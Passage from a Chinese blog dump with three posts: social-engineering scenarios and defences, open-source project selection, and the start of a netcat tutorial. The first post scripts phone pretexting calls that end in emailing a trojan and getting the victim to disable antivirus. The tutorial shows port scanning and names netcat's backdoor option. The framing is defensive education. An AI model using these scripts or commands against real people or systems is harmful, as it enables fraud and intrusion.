有句话俺必须再啰嗦一下：按照二八原理，大部分人都是感性的。为啥上述的这些伎俩能够屡试不爽？就因为这些技巧充分利用了人们感性的弱点。如果你是一个感性的人，那可要小心啦：你可能会容易入上述这些圈套，平时须得小心防范。 不过捏，凡事总有两面性滴。你一方面要提防别人通过这些招数影响你，另一个方面，你也可以利用这些东东去影响别人。虽说今天是为了介绍社会工程学才扯了这么多施加影响的招数，但这些玩意儿可不仅仅限于社会工程学哦。在很多很多不同的领域（比如：管理、谈判、社交、追 MM/GG、推销 ……），今天讲的这些东西都是非常有用滴。大伙儿一定要活学活用、举一反三啊，才不枉费俺打了这么多字！ 本系列的下文，咱们搞几个综合的示例来分析一下。 扫盲“社会工程学”[4]：【综合运用】举例文章目录 ★举例1：获取通讯录★举例2：获取财务报表★总结 前面的几个帖子已经介绍了社会工程学的一些常见伎俩（主要是“信息收集”、“假冒身份”、“施加影响”这三个手法），今天俺要来举几个综合性的例子。通过这些例子，大伙儿可以见识一下那些社会工程学的老手是如何把各种伎俩有机结合起来，并达到最终的目的。 为了避免引起不必要的误解，俺事先声明如下： 由于本人才疏学浅，难以凭空捏造出各种社会工程学案例的场景，因此后面有些例子的灵感，是来自于凯文·米特尼克所著的《欺骗的艺术》。另外，俺举这些例子只是教大家如何防范，决无教唆的意图。如果有人企图追究俺教唆犯罪的责任，拜托去找米特尼克先生，别来找俺滴麻烦 :-) ★举例1：获取通讯录 某个聪明的猎头（按照前文的惯例，不妨称之为小黑）需要搞到一家大公司研发部门的通讯录。为了达到目的，小黑决定采取一些社会工程学的技巧。 首先，要选定突破口——也就是容易被利用的人。在这个案例中，小黑决定从前台和研发部秘书作为突破口。为啥要选择两个人捏？有一个原因在于，这两人的工作性质决定了他们会比较乐于助人，也就比较容易被小黑利用。接下来，咱们看看小黑是如何达到目的。 ◇步骤1：获取前台的Email地址 此步骤就是之前的帖子介绍的“信息收集”。由于前台的电子邮件地址不是敏感信息，不会有严格的访问控制，可以比较容易获取。比如想办法拿到前台的名片或者在打电话跟前台套近乎。具体细节俺就不多啰嗦了。 ◇步骤2：搞定研发的秘书 接着，小黑打电话给研发的秘书（搞到研发秘书的分机号也不是什么难题），然后谎称自己是总裁办的秘书，急需一份研发人员的清单。然后，小黑让研发的秘书把整理好的人员清单发送到 xxxx 邮件地址（也就是步骤1获取的前台 email 地址）。这个步骤是整个计划的关键点。为了达成此步骤，需要用到“假冒身份”和“施加影响”这两个手法。通过冒充总裁办的人，造成一种潜在的威慑。而且小黑在通话的过程中自然流露出焦急的情绪，显得更加逼真。对于研发秘书而言：虽然研发人员的清单比较敏感，但由于索要清单的是总裁办的人，也就不好拒绝了。而且对方留得email地址是本公司的邮箱，想想也就没啥好顾虑的了。 ◇步骤3：搞定前台 打完步骤2的电话之后，小黑就赶紧打第3个电话给前台。下面是双方的对话。 前台：你好，哪位？小黑：我是总裁办的XXX秘书。前台：你有什么事情吗？小黑：我正陪同XX副总裁在某处开会，XX副总裁需要一份资料。我已经找人整理好了，等一下会发到你的邮箱。你收到之后，请帮忙传真到XXXXXXXX号码。前台：好的。还有其它事情吗？小黑：没有了，多谢！ 对于前台而言，她先接到一个电话让她收邮件，紧接着确实收到一份从公司内部邮箱发出的材料。所以她自然也就不会起疑心了。 ★举例2：获取财务报表 前面的那个例子稍显简单，再来说一个稍微复杂点的例子。 某商业间谍兼资深黑客（还是简称为小黑）需要搞到某大公司内部的财务报表（可以卖大价钱哦）。由于这个财务报表是很敏感的资料，一般员工是接触不到滴，只有财务部的少数主管才能看到这些报表。而财务部的主管，肯定都知道这些报表的重要性。所以，小黑再想用”案例1”的伎俩是行不通滴。 小黑冥思苦想之后，决定采用“木马计”，在财务主管的电脑中植入木马（如果你不晓得“木马”是啥，自己先上网查一下）。一旦木马植入成功，那财务报表就是手到擒来、不费吹灰之力了。具体的实施步骤如下： ◇步骤1：准备阶段 准备阶段主要办三件事：首先，想办法搞到公司的通讯簿。通过案例1，大伙儿应该知道这个不难办到；然后，通过各种途径（具体的途径，请看之前的“信息收集”）了解该公司内部的一些情况（尤其是 IT 支持部和财务部的人员情况）；最后，用化名去开通一个手机（有经验的攻击者肯定用假名，以免被抓）。 ◇步骤2：忽悠财务主管 由于前面的准备工作，小黑了解到财务部某主管（不妨叫小白）的姓名和分机号。然后小黑打给该主管。下面是双方对话。 小白：你好，哪位？小黑：我是IT支持部的张三。你是财务部的主管小白吧？小白：对的。有啥事儿？小黑：最近几天，你们财务部的网络正常吗？有没有感觉网络时断时续的？小白：好像没有嘛。小黑：有几个其它的部门反映网络不正常，所以我来问问你们的情况。如果这几天你碰到网络异常，请打电话给我。我最近忙着处理电脑网络的故障，不经常在座位上。你可以打我的手机，号码是13901234567。小白：好的，我记一下。小黑：另外，我想确认一下你电脑的网络端口号。小白：什么是“网络端口号”？小黑：你先找到你电脑的网线，在网线插在墙上的地方应该贴个标签，那上面的写的号码就是你电脑的“网络端口号”。你把上面的号码告诉我。小白：等一下，我看一下……哦，看到了，上面写着“A1B2C3”。小黑：嗯，很好。我只是例行确认一下。祝你工作愉快。再见。 ◇步骤3：欺骗IT支持部 接着小黑耐着性子等待2到3天，然后打电话给 IT 支持部的某工程师（不妨称李四）。由于之前的准备工作，小黑知道李四管理公司的某些路由器和交换机。 小黑谎称自己是新来的网络工程师，正在财务办公室帮小白排查网络问题，请李四帮忙把网络端口号为“A1B2C3”的网络连接断开。 对李四而言，由于对方能准确说出小白的姓名以及小白电脑的网络端口号，所以李四就相信了他的话，并按照要求把对应的网络连接断开。 ◇步骤4：等待鱼儿上钩 打完这个电话之后，接下来小黑就稍息片刻，等着小白的电话。果然，不出几分钟，小白就打了他的手机。 小黑：你好，我是IT支持部的张三。你是哪位？小白：我是财务部的小白主管。前几天你给我打过电话的，还记得吗？今天网络果然出问题了。所以打你电话找你帮忙。小黑：哦，是吗？那我帮你查一下，应该很快能搞定的。 大约十分钟之后，小黑重新打给IT支持部的李四，让他把端口号为“A1B2C3”的网络连接重新开通。 ◇步骤5：大功告成 网络重新开通之后，小黑又打给小白。 小白：你好，哪位？小黑：我是IT支持部的张三。刚才已经帮你把网络故障解决了。你现在试试看，网络应该通了。小白：我看一下，嗯，果然通了！太好了！太谢谢你了！小黑：不过，最近几天这个问题可能还会反复出现。小白：啊！那可咋办？我们财务部月底正忙着呢？可经不起这个折腾啊！小黑：办法倒是有一个，你需要安装一个网络模块的补丁，基本上就可以解决这个问题了。我等一下发到你邮箱中。你收到之后，把邮件附件中的程序安装一下就行了。小白：哦，好的。小黑：顺便提醒你一下，有些杀毒软件可能会把这个补丁误报为有害程序。你如果碰上这种情况，可以先把杀毒软件关闭，再重新安装一次就可以了。小白：哦，我晓得了，谢谢。 然后，小黑就往小白的邮箱发了一个木马，并且把邮件的发件人地址伪装成 IT 支持部张三的地址，免得引起怀疑。 对于小白而言，张三（冒充的）刚刚帮他解决了网络故障。所以小白根本不会怀疑此人的身份。自然也不会怀疑邮件有诈。 ★总结 由于篇幅有限，俺就不多举例了。从上述案例来看，社会工程高手在搞定复杂问题之前，一般会制定好一个计划，并且在计划的每一个步骤都会充分利用前面几个帖子提到的技巧。另外，在整个攻击过程中，攻击者无非就是做一些调研，打几个电话，成本非常低，被抓的风险也很小；而他们一旦得手，获益却很大。可能就是由于这种较大的反差，导致社会工程攻击在整个信息安全领域的比重不断增加。 本系列的下一个帖子，俺来介绍一下如何防范社会工程学攻击。 扫盲“社会工程学”[5]：你该如何【防范】？文章目录 ★组织机构该如何做？★个人该如何做？ 经过前面几个帖子的介绍，大伙儿应该能看出来，社会工程学的应用范围是很广泛滴。它的应用会涉及日常生活的许多领域，绝不仅限于信息安全。所以，如何防范就是一个重要的话题了。今年咱们就来聊一下如何防范。 ★组织机构该如何做？ 如果你是某公司/某机构里的一个小头目或大头目、甚至老板，那就得多看看这一节；否则的话，直接跳过本节，看下一个章节（个人该如何做）。 ◇普及教育 最要紧的一条就是普及教育了。否则俺也不会在电脑前吭哧吭哧打这么多字，写这么个系列了。一些常识性的基础培训是很重要滴。按照二八原理，20%的简单培训就可以防范80%的潜在攻击。由于“人”是社会工程攻击的主要对象，并且有经验的攻击者都善于寻找组织机构的弱点，所以普及教育务必要涵盖到每一个人（连公司的扫地阿姨也不要放过哦**:-**）。 另外要强调的一点是：要重视对新员工的培训。很多时候，新员工往往是攻击者的突破点。首先，新员工初来乍到，跟周围的同事不熟，容易把攻击者误认为同事；其次，新员工往往怕得罪人，容易答应攻击者的各种要求。 ◇严格的认证 认证（Authentication）是一个信息安全的常用术语。通俗地说，认证就是解决某人到底是谁？ 由于大部分的攻击者都会用到“身份冒充”这个步骤，所以认证就显得非常必要。只要进行一些简单的身份确认，就能够识破大多数假冒者。比如碰到公司内不认识的人找你索要敏感资料，你可以把电话打回去进行确认（最好是打回公司内部的座机）。 ◇严格的授权 授权（Authorization）和认证一样，也是一个常用的信息安全术语。通俗地说，授权就是解决某人到底能干啥？ 对于组织机构来说，授权要尽量细化、尽量最小化。 举个例子。如果某软件公司中，所有的程序员都可以访问所有的源代码，那源代码泄漏的风险就很大。只要有一个人出问题，攻击者就可以得逞。反之，如果每个人只能访问自己开发的那部分代码，那安全风险就会小很多。即使某人上当受骗，也只会泄漏部分代码。 ◇信息分类 在组织机构中，最好要有信息分类的制度。根据信息的重要程度，定出若干级别。越是机密的信息，知道的人越少。 比如在我负责的团队中，源代码的敏感度高于软件安装包。因此，源代码服务器只有开发人员能够访问；而放置安装包的发布服务器，大部分人（比如测试人员、产品人员）都可以访问。 ◇别乱丢办公垃圾 看完信息收集，大伙儿应该明白，乱扔垃圾可不光是砸到花花草草的问题，更危险的是给垃圾分析者提供了大量有价值的素材。这也就是为啥要给扫地阿姨培训社会工程学的道理。 ◇文化 最后再来说一下企业文化对社会工程攻击的影响。 在前文，俺已经介绍了“通过权威来施加压力”的攻击手法。如果某个组织机构的等级很森严，就容易给攻击者留下利用的机会。还有一些组织机构，里面的人员都是好好先生，每个角落都是一团和气。这种机构和等级森严的组织一样，容易被攻击者利用。 所以，假如你碰巧是组织机构内部的一个实权人物，或许可以尝试改变一下现状。不过俺要提醒一句，一个组织机构（尤其是政府机构）的文化是很难轻易改变滴。所以，别对这个招数报太大希望 :-( ★个人该如何做？ 前面介绍了企业内部的防范措施，接着就该说说个人该如何应对了。 ◇多了解一些社会工程学的手法 俗话说：知己知彼，百战不殆。如果你不想被人坑蒙拐骗，那就得多了解一些坑蒙拐骗的招数。除了俺提到过好几次的《欺骗的艺术》（凯文·米特尼克所著），你还可以通过互联网找到很多类似的资料。这些资料有助于你了解各种新出现的社会工程的手法。 另外，很多文学作品、影视节目也会掺杂社会工程学的情节。比如前段时间热播的《潜伏》，里面的主人公余则成显然是一个社会工程学老手。细心的同学应该能从中窥探到不少奥妙。 ◇保持理性 在如何施加影响里，俺已经列举了很多种手法。这些手法不外乎都是利用人【感性】的弱点，然后施加影响。所以，尽量保持理性的思维（尤其在和陌生人沟通时）有助于减少你被攻击者忽悠的概率。不过捏，保持理性，说起来简单，做起来未必简单 :-( 以后俺有空再来聊聊这方面的话题。 ◇保持冷静 还有一些“社会工程学”的惯用伎俩是【制造恐慌】。大部分人在慌乱之中就容易入套。 所以，保持冷静也很重要。不过捏，还是刚才那句话——说起来简单，做起来未必简单。 ◇保持一颗怀疑的心 这年头，除了骗子是真的，啥都可能是假的。比如，你收到的邮件，发件人地址是很容易伪造滴；比如，你公司座机上看到的来电显示，也可以被伪造；比如，你收到的手机短信，发短信的号码也可以伪造。 所以，保持一颗怀疑的心，也是非常必要的啊！ ◇别乱丢生活垃圾 :) 不光上述提到的办公垃圾有潜在风险，生活垃圾一样也会被垃圾分析者利用。比如有些粗心的同学会把帐单、发票、取款机凭条等东西随意丢在垃圾桶中。一旦碰上有经验的垃圾分析者，你没准就麻烦了。 ◇（其它） 肯定还有俺没提及的防范措施，欢迎大伙儿（到博客评论区）补充。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"}]},{"title":"如何选择开源项目？","date":"2021-07-16T16:01:33.000Z","path":"2021/07/17/如何选择开源项目？/","text":"如何选择开源项目？文章目录 ★License（授权协议、许可证）★技术层面的因素★普及程度（用户的人气）★活跃程度（开发的人气）★其它的风险 近几年开源项目越发普及，很多商业软件都逐渐引入开源项目。由于俺负责的产品线采用了不少开源项目（主要是 C++、Java、Python），这几年就经常会碰到开源项目选型的问题（从几个具有类似功能的开源软件项目中进行抉择）。今天我就大概聊一下自己的几点看法，供大伙儿参考。 ★License（授权协议、许可证） License 是很多人容易忽略的一个问题，所以我们先来聊一下 License 的问题。因为公司里面开发的软件大都属于商业软件（更严谨的叫法是“专属闭源软件”），根据开源协议和商业的冲突程度，可以分为三种：非常友好、不太友好、很敌对。下面分别介绍一下： ◇对商业闭源软件“很敌对”的协议 先说说“很敌对”的协议：GPL（详细解释请看“这里”）。GPL 和闭源软件是有严重冲突的。通俗地说，如果某个软件使用了基于 GPL 协议的【动态库或静态库】，则【整个软件】必须也用 GPL 协议发布（这就是大名鼎鼎的【GPL 传染性】）。也就是说——如果你开发的是【闭源】软件，一旦发现自己想用的某个开源库属于 GPL 协议，即使功能再强再好用，也只好忍痛割爱了。 在此郑重提醒大伙儿，【切莫】抱侥幸心理，偷偷使用。一旦被雪亮的群众眼睛所发现，不光害了自己的名节，公司的名节也不保。 ◇对商业闭源软件“不太友好”的协议 因为 GPL 对于商业闭源软件太不友好了，估计当年很多开源库的作者怨声载道。GNU 组织为了缓和一下矛盾，搞出了一个折衷的 LGPL 协议（详细解释看“这里”）。这个协议相对 GPL 来说，宽松了一些：商业闭源软件在【不公开】代码的前提下，可以在产品中使用 LGPL 的开源库。所以 LGPL 属于商业“不太友好”的协议。 ◇对商业闭源软件“很友好”的协议 最后来说一下“非常友好”的协议，比较出名的有这几种：BSD、MPL（Mozilla）、Apache、MIT。这些协议不但允许项目的使用者使用开源库，有些还允许对开源库进行修改并重新分发。因此用起来特别爽。上述这几个协议在细节上有些小差异，大伙儿可以去它们官网瞧一下。 另外，有些开源软件使用公共域授权（Public Domain，详细解释看“这里”）。简单说，就是不作任何限制，软件的使用者可以为所欲为 :) ◇其它协议 上面提到的几种协议都是知名协议。还有少数开源项目不是采用知名协议，而是自己搞了一套协议。如果你碰到这种情况，就得硬着头皮认真读一遍协议上的洋文，看看它对于使用者有些什么限制了。 ★技术层面的因素 由于技术层面的考量和你所开发的软件密切相关，因此这方面的评判依据千差万别。我只能挑几个比较通用的说一下。 假如你开发的是跨平台的项目，那么你选择开源项目就得考虑它支持哪些平台（硬件平台、操作系统平台、数据库平台）。如果你需要支持的平台它不能支持，那就赶紧另找一个。 有时候编译器的支持也是考虑的指标之一。比如俺曾经实施一个 Java 项目，用户的环境是 JDK 1.4。那么有些用了 Java 1.5 新语法的开源库就不能使用。 假如你开发的软件是性能敏感的，那选型的时候就要测试一下几个候选项目的性能指标。 现在安全问题越来越严重。如果你比较在意安全性的话，还得顺便调查一下候选项目是否有安全问题（比如缓冲区溢出的 bug、比如跨站脚本注入等）。 ★普及程度（用户的人气） 所谓的普及程度，就是看开源项目的用户占有率。当然大伙儿不是搞市场调查的，花钱请市场调查公司也不现实。简单的办法就是用搜索引擎大致搜一下，就能看出几个候选项目使用的广泛度了。 还有另外一个判断普及程度的方式，就是看某个开源项目是否被知名的软件或者公司采用。比如 Firefox（算是知名软件）采用 Sqlite 来存储页面缓存和 cookie，这至少可以从侧面反映出 Sqlite 项目的优秀程度。 对于若干个候选项目，显然要优先考虑普及度高的那个。因为某个项目普及度高，至少说明（但不绝对）它比较成熟、稳定、安全。而且用的人多了之后，相应的文档也会多一些，碰到问题也容易找到人咨询。 ★活跃程度（开发的人气） 这里说的“活跃”，是指开发层面而言。 一般来说，一个项目越活越，则新功能的推出越快，对提交 bug 的响应也越快。还有些项目，由于开发人员不再继续开发（可能开发人员厌倦了、可能开发人员太忙了），从而导致活跃度很低。 不过也有例外——有些项目由于已经非常完善了，因此反而活跃程度很低。俺印象中：最近几年 bzip2 就很少有更新，但它是非常优秀的压缩库。 ★其它的风险 最后来说说一些其它的风险。一般来说，只有当前几个因素都差不多的时候，才会来考虑其它风险。 ◇“单点故障”的风险 很多项目过于依赖【个人英雄主义——光靠着一两个大牛完成整个项目。一旦大牛出现意外，必然导致整个项目受到严重影响。典型的例子就是 ReiserFS 文件系统的创始人 Hans Reiser。这位老兄由于谋杀妻子的罪名成立，被判入狱15年（对 IT 八卦有兴趣的同学可以看“这里”）。导致 ReiserFS 项目受到严重影响。 顺便说一下： 这类风险在开源界有个专门的术语叫“Bus Factor”，翻译成“巴士因子”或“卡车系数”。指的是——项目中有多少个关键人物【同时】出车祸，才会导致项目瘫痪。 ◇商业风险 还有些开源项目被商业公司收购后，由于种种原因（商业、管理、政治等）导致该开源项目受到不利影响。比如上星期听说 Michael Widenius（MySQL 共同创始人）和 Marten Mickos（MySQL 前任 CEO）从 Sun 离职。再加上去年10月走掉了的 David Axmark（MySQL 共同创始人）。估计对 MySQL 的影响不小。 上述提到的几个考量指标，排在越前面的，权重越高。你在选型时需要综合考虑这几个因素。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"}]},{"title":"netcat","date":"2021-07-16T15:54:54.000Z","path":"2021/07/16/netcat/","text":"扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”文章目录 ★引子★netcat 是个啥玩意儿？★netcat 能干啥？★nc 命令行简介★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口★招数3：（渗透测试）用 nc 玩“端口扫描”★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问★招数7：（网络配置）基于 nc 的端口转发（Port Forward）★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）★招数9：（系统管理）用 nc 传输文件★招数10：（系统管理）用 nc 远程备份整个磁盘★招数11：（入侵手法）用 nc 开启【被动】连接型后门★招数12：（入侵手法）用 nc 开启【主动】连接型后门★附录：netcat 的【其它变种】 ★引子 这些年来，俺在博客上写了若干“信息安全教程”，其中不免会涉及到【网络配置】。 由于读者中有很多是“技术菜鸟”，经常在配置网络的时候卡壳——有些人是因为粗心，还有些是被系统的防火墙干扰了（误导了）。 今天这篇，一个主要目的就是：教你如何用 netcat 这个牛逼的小工具进行网络诊断、网络配置、系统管理 …… 此文的另一个目的是：介绍黑客/骇客是如何利用 netcat 这个工具来辅助入侵。所谓【知己知彼】，注重安全防范的同学，也应该稍微了解一些入侵者的手法。 1234567891011121314---------------------| /\\_/\\ || / 0 0 \\ || ====v==== || \\ W / || | | _ || / ___ \\ / || / / \\ \\ | || (((-----)))-&#x27; || / || ( ___ || \\__.=|___E || / |--------------------- ★netcat 是个啥玩意儿？ netcat 一般简称为 nc，直译为中文就是“网猫”，被誉为——【网络上的瑞士军刀】。 它诞生于1995年，在网络安全社区的名气很大（就如同 AK47 在军事领域的名气）。长期在安全圈内混的人，应该都知道它。想当年，insecure.org 网站在本世纪初搞过几次“年度投票”，评选优秀的安全工具。每次投票，netcat 都能排进前几名。 ★netcat 能干啥？◇概述 简而言之，nc 是一个【命令行】工具，能够让你很方便、很灵活地地操纵【传输层协议】（这里所说的“传输层协议”指的是 OSI 模型中的第4层，主要是 TCP ＆ UDP）。 ◇nc 的变种 由于 nc 是如此牛逼，而它本身又很小（不但软件很小，源代码也很少）。很容易就衍生出一大堆【变种】。不同的变种，会在原有 nc 的基础上增加一些新功能。 由于变种之间存在差异。在本文的开头部分，俺有必要先声明一下：这篇教程的内容，主要基于 OpenBSD 社区的变种（也叫“OpenBSD netcat”或“netcat-openbsd”） 顾名思义，这是由 OpenBSD 社区重写的 netcat，主要增加了对“IPv6、proxy、Unix sockets”等功能的支持。另外，在细节上也有若干完善。 虽然它出自 OpenBSD 社区，但很多主流 Linux 发行版的官方软件仓库已包含这个变种（比如说：Debian 家族、Arch 家族、openSUSE 家族、Gentoo 家族……）。 为了打字省力，本文后续部分提到的 nc，除非专门注明，否则都是指：netcat 的 OpenBSD 变种。如果俺要称呼【原始】的那个 netcat，俺会称之为“原版 nc”（洋文叫做“traditional netcat”）。 另， 在本文末尾，俺单独开一个章节，简单聊聊 nc 的其它几个变种。 ★nc 命令行简介 要使用 nc，你就需要在【命令行】中与它打交道（它所有的功能，都以命令行的方式呈现给你用）。 ◇nc 命令行的常规形式 一般来说，nc 的命令行包括如下几个部分： 1nc 命令选项 主机 端口 命令选项 这部分可能包含 0~N 个选项 （注：这部分最复杂，下一个小节单独聊）主机 这部分可能没有，可能以“点分十进制”形式表示，也可能以“域名”形式表示。端口 这部分可能没有，可能是单个端口，可能是端口范围。 对于“端口范围”，以两个数字分别表示“开始和结束”，中间以【半角减号】相连。举例：1-1024 ◇何为“命令行选项”？ 简单来说，nc 提供了一大堆【命令行选项】，分别对应它提供的功能。每个选项都是“单字母”滴。有些选项需要带【选项值】，有些不需要。 你要使用的选项都放在 nc 这个命令之后，每个选项前面要有一个【半角减号】，选项之间以空格分开。 举例： 在下面这个例子中，分别用到了三个选项（l、p、v），其中 12345 是选项 p 所带的【选项值】。 1nc -l -p 12345 -v 如果你的系统中已经有 nc（且 nc 已添加到【PATH 环境变量】），在命令行中执行如下，就可以看到它支持的全部命令选项的列表。 1nc -h 顺便说一下：在上述命令的输出中，如果第一行包含 OpenBSD 这个单词，就说明你当前用的“网猫”是 OpenBSD 变种。 ◇【常用的】命令行选项 由于上述命令显示的帮助是洋文。为了照顾新手，俺稍作解释（只列出【常用的】那些）。 选项 是否有“选项值” 说明 h NO 输出 nc 的帮助 v NO 在网络通讯时，显示详细的输出信息 注：建议新手多用该选项，出错时帮你诊断问题 n NO 对命令行中的“主机”，【不】进行域名解析 注：如果“主机”是“点分格式”的 IP 地址，需要用该选项； 如果“主机”是“域名”形式，【不能】用该选项 p YES 指定“端口号” l NO 开启“监听模式”，nc 作为【服务端】 注：如不加该选项，nc 默认作为客户端 u NO 使用 UDP 协议 注：如不加该选项，默认是 TCP 协议 w YES 设置连接的超时间隔（N 秒） q YES 让 nc 延时（N 秒）再退出 z NO 开启“zero-I/O 模式” 注：该选项仅用于“端口扫描”，后面会聊到 k NO 配合 -l 选项使用，可以重复接受客户端连接。 注：“原版 nc”的该选项用来开启“TCP keepalive” 这是“原版 nc”与“OpenBSD 变种”之间的差异之一 X YES 指定代理的类型（具体用法，后面会聊到） 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一 x YES 以 IP:port 的格式指定代理的位置。 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一 e YES 启动某个进程，把该进程的“标准输入输出”与网络通讯【对接】 注：通常用该选项开启一个网络后门 “OpenBSD 变种”基于安全考虑，已去掉该选项， 但还是能用间接的方式达到同样的效果 :) 汇总上述表格，只是用来【速查】。俺会在后续章节具体介绍每个命令选项的详细用法。 ◇命令行选项的【合写】形式 有时候要同时用到多个选项，可以“合写在一起”，在前面共用一个【半角减号】。 还拿刚才俺举的例子，以下几种写法是【等价】滴。 1234nc -lp 12345 -vnc -l -v -p 12345nc -lv -p 12345nc -lvp 12345 ◇如何强行终止 nc？ 一般来说，在命令行环境下，你可以用【Ctrl C】这个组合键来强行终止当前运行的进程。 对 nc，你同样可以这么干。 ★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达◇使用场景 经常有这种需求，要判断某个主机的监听端口是否能连上。 导致监听端口【无法】，通常有两种原因：其一，这个监听端口根本就【没开启】；其二，监听端口虽然开启，但是被防火墙阻拦了。 对第1个原因，（如果你能在该主机上运行命令）可以直接用 netstat 这个命令查看监听端口是否开启 但对于第2个原因，netstat 就用不上了。这时候就可以用 nc 来帮你搞定。 ◇方法 用如下命令可以测试某个 IP 地址（x.x.x.x）上的某个监听端口（xx）是否开启。 1nc -nv x.x.x.x xx 上述命令用到了如下几个选项： 选项 -v 如果你是 nc 的新手，俺建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。 在本文后续的举例中，俺会尽量都加上这个选项（但这段话就不再重复唠叨啦） 选项 -n 由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析； 反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。 ◇补充说明：超时设置 在测试链接的时候，如果你【没】使用 -w 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。 如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“-w 选项”，设置一个比较小的超时值。在下面的例子中，超时值设为3秒。 1nc -nv -w 3 x.x.x.x xx ◇补充说明：UDP 通常情况下，要测试的端口都是 TCP 协议的端口；如果你碰到特殊情况，需要测试某个 UDP 的端口是否可达。nc 同样能胜任。只需要追加 -u 选项。 ★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口◇使用场景 前一个章节（招数1）的场景是——已经有某个网络软件开启了监听端口，然后用 nc 测试端口是否可达。 现在换另一个场景： 假设你正在配置防火墙规则，禁止 TCP 的 8080 端口对外监听。那么，你如何【验证】自己的配置是 OK 滴？ 更进一步说：如果当前【没有】任何软件开启 8080 这个监听端口，你如何判断：该端口号是否会被防火墙阻拦？ 为了叙述方便，设想如下场景：有两台主机——“主机C”充当客户端，“主机S”充当服务端。然后要判断“主机S”上的防火墙是否会拦截其它主机对 8080 TCP 端口的连接。 ◇方法 在“主机S”上运行 nc，让它在 8080 端口，命令如下： 1nc -lv -p 8080 选项 -l 这个选项会让 nc 进入监听模式。 选项 -p 这个选项有“选项值”，也就是具体端口号。 然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达（具体的命令行参见前一章节“招数1”） ◇补充说明：是否省略“-p”？ 某些 nc 的变种，在开启监听模式时，可以省略“-p”，上述命令变为如下： 1nc -lv 8080 但考虑到兼容性，（在后续章节中）俺总是写上 -p 选项。 ◇补充说明：如何让 nc 的监听端口【持续开启】 在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。 为啥会这样捏？因为当年设计 nc 更多的是作为某种网络诊断/配置工具，并【不是】真拿它当服务端软件来用的。 如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 -k 选项。 ◇补充说明：UDP 上述举例是基于 TCP 协议。如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 -u 选项。 ★招数3：（渗透测试）用 nc 玩“端口扫描”◇使用场景 在“招数1”里面介绍了：如何测试【单个】端口是否可达。 扩展一下：如果你要测试的不止一个端口，而是某个【范围】的端口。这种行为有个专门的术语叫【端口扫描】。 “端口扫描”是一把双刃剑——“黑帽子”用这招进行信息收集，为后续的入侵做铺垫；“白帽子”用这招来进行“渗透测试”，以排查自己系统中【尚未屏蔽】的对外监听端口。 作为一款牛逼的网络瑞士军刀，nc 当然可以用来干这事儿啦。 顺便说一下：不论是 TCP 还是 UDP，协议规定的【有效】端口号范围都是：1 ~ 65535 ◇方法 下面这个命令，用来扫描 IP 地址为 x.x.x.x 的主机，扫描的端口范围从 1 到 1024 1nc -znv x.x.x.x 1-1024 选项 -z 意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。选项 -n （前面已聊过，参见“招数1”）选项 -v-v 选项前面也聊过，这里要特地强调一下。 对 nc 的其它用法，-v 选项是可加可不加滴；但对于“端口扫描”而言，一定要有这个选项——否则你【看不到】扫描结果。 ◇补充说明：优化输出 玩“端口扫描”的时候，“-v 选项”会把“成功/失败”的结果统统打印出来。 通常大伙儿关注的都是“扫描成功”的那些端口。因此，可以用如下命令过滤一下，只打印扫出来的端口。 1nc -znv x.x.x.x 1-1024 2&gt;&amp;1 | grep succeeded 由于“-v 选项”产生的输出位于【stderr】，上述命令中的 2&gt;&amp;1 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）grep 命令用来进行【过滤】。对于 Windows 系统，默认【没有】grep 命令，需改用 find 命令过滤。 ◇补充说明：超时设置 如果你要扫描的端口范围，跨度比较大，超时值要【恰到好处】——超时值太大，会浪费时间；超时值太小，可能会遗漏某些端口（端口本身开放，但 nc 还没来得及连上就超时了） 具体如何设置，参见“招数1”的“补充说明”。 ◇补充说明：【并发】扫描 如果你设置了较小的超时值，依然嫌慢，还可以用【并发】扫描的方式，进一步提升效率。 简而言之就是：同时运行多个 nc，分别扫描不同的端口范围。 ★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）◇使用场景 （本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过） 如果你想用 nc 干一些“不为人知”的事情，首先要考虑的是——如何消除【网络层面】的踪迹。 最容易想到的当然就是——让 nc 走暗网（比如 